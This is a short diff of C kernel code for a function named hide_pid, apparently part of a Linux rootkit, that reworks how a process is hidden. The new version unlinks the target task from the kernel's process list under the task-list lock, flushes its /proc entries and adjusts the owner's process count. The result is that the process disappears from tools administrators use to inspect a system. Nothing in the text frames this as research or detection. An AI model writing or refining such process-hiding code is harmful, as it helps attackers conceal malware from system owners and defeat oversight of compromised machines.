@@ -67,21 +67,19 @@ hide_pid(pid_t pid)
     add_pid_to_list(hidden_pids_tail, pid);
 
     struct task_struct *ts = pid_task(find_vpid(pid), PIDTYPE_PID);
-    struct task_struct *ts2;
+
+    if (!ts)
+        return;
 
     rcu_read_lock();
-    for_each_process(ts2) {
-        task_lock(ts2);
-        if(ts == ts2) {
-            task_unlock(ts2);
-            continue;
-        }
-    }
-    list_del(&ts->tasks);
-    for_each_process(ts2) {
-        task_unlock(ts2);
-    }
+    atomic_dec(&__task_cred(ts)->user->processes);
     rcu_read_unlock();
+    proc_flush_task(ts);
+
+	write_lock_irq(&tasklist_lock);
+    list_del(&ts->tasks);
+    write_unlock_irq(&tasklist_lock);
+    call_rcu(&ts->rcu, delayed_put_task_struct);
 }
 
 void
